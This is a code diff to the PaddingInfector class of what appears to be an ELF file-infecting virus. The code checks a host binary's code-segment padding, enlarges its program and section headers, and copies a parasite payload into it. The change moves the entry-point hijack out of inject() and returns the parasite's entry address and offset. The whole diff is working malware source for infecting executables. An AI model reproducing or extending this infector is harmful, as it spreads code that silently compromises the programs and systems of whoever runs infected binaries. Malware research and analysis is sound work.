@@ -1,8 +1,6 @@
 #include "infector/padding_infector.hh"
 #include "common/macros.hh"
 #include "common/math.hh"
-#include "common/patch_pattern.hh"
-#include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
 #include "nostdlib/string.hh"
 
@@ -39,10 +37,6 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t parasite_size_and_padding,
   // expand the size while accounting for the alignment padding.
   phdr_entry->p_filesz += parasite_size_and_padding;
   phdr_entry->p_memsz += parasite_size_and_padding;
-}
-
-void patch_ehdr(Elf64_Ehdr& header, Elf64_Addr parasite_load_address) {
-  header.e_entry = parasite_load_address;
 }
 
 }  // namespace
@@ -126,14 +120,15 @@ bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
   return false;
 }
 
-bool PaddingInfector::inject(std::span<std::byte> host_mapping,
-                             std::span<const std::byte> parasite_mapping) {
+std::optional<InjectionResult> PaddingInfector::inject(
+    std::span<std::byte> host_mapping,
+    std::span<const std::byte> parasite_mapping) {
   if (padding_size_ < parasite_mapping.size()) {
     vt::printf(STR_LITERAL(
                    "Host cannot accomodate parasite padding size: %%d parasite "
                    "size:%%d\n"),
                padding_size_, parasite_mapping.size());
-    return false;
+    return std::nullopt;
   }
 
   const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
@@ -149,24 +144,18 @@ bool PaddingInfector::inject(std::span<std::byte> host_mapping,
     // Patch section header table to increase text section size.
     if (!patch_sht(ehdr, shdr, parasite_size_and_padding_,
                    code_segment_last_byte_offset_)) {
-      return false;
+      return std::nullopt;
     }
-  }
-
-  {
-    auto& mutble_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
-    // Patch elf header entry point to run the parasite first.
-    patch_ehdr(mutble_ehdr, parasite_load_address_);
   }
 
   // Inject parasite.
   vt::memcpy(&host_mapping[parasite_file_offset_], &parasite_mapping.front(),
              parasite_mapping.size());
 
-  // Patch parasite to resume host code after execution.
-  return common::redirect_elf_entry_point(
-      original_entry_point_, parasite_load_address_, parasite_file_offset_,
-      parasite_mapping.size(), host_mapping);
+  return InjectionResult{
+      .parasite_entry_address = parasite_load_address_,
+      .parasite_file_offset = parasite_file_offset_,
+  };
 }
 
 }  // namespace vt::infector
